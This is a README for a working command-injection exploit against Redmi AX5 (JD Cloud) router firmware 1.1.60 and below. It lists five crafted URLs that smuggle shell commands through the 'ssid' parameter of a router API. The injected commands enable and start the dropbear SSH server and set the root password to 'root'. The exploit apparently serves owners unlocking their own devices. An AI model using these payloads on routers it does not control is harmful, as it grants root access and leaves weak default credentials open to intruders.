## Usage

1. Make sure your firmware version is 1.1.60 or below.
2. Login to get  `TOKEN`.
3. Edit payload url to execute commands.
4. SSH is enabled. You can login with username `root` and password `root`.

## Payload

Version: Stable version 1.1.60 and below.

```
http://192.168.31.1/cgi-bin/luci/;stok=TOKEN/api/misystem/set_config_iotdev?bssid=Xiaomi&user_id=longdike&ssid=-h%0anvram%20set%20ssh_en=1%0anvram%20commit%0a

http://192.168.31.1/cgi-bin/luci/;stok=TOKEN/api/misystem/set_config_iotdev?bssid=Xiaomi&user_id=longdike&ssid=-h%0aecho%20sed%20-i%20's/channel=.*/channel="debug"/g'%20/etc/init.d/dropbear%20>%20/tmp/r.sh%0ash%20/tmp/r.sh%0arm%20/tmp/r.sh%0a

http://192.168.31.1/cgi-bin/luci/;stok=TOKEN/api/misystem/set_config_iotdev?bssid=Xiaomi&user_id=longdike&ssid=-h%0a/etc/init.d/dropbear%20start%0a

http://192.168.31.1/cgi-bin/luci/;stok=TOKEN/api/misystem/set_config_iotdev?bssid=Xiaomi&user_id=longdike&ssid=-h%0a/etc/init.d/dropbear%20enable%0a

http://192.168.31.1/cgi-bin/luci/;stok=TOKEN/api/misystem/set_config_iotdev?bssid=Xiaomi&user_id=longdike&ssid=-h%0aecho%20echo%20-e%20"root\nroot"%20|%20passwd%20root%20>%20/tmp/pass.sh%0ash%20/tmp/pass.sh%0arm%20/tmp/pass.sh%0a
```

## Reference

* [解锁京东云 Redmi AX5 ssh  (m1ku.in)](https://m1ku.in/archives/783)
* https://github.com/NyaMisty/luadec_miwifi
* [[Ax5京东云\]1.1.47固件下载地址 - 京东云无线宝 - 恩山无线论坛 - Powered by Discuz! (right.com.cn)](https://www.right.com.cn/forum/thread-4128465-1-1.html)
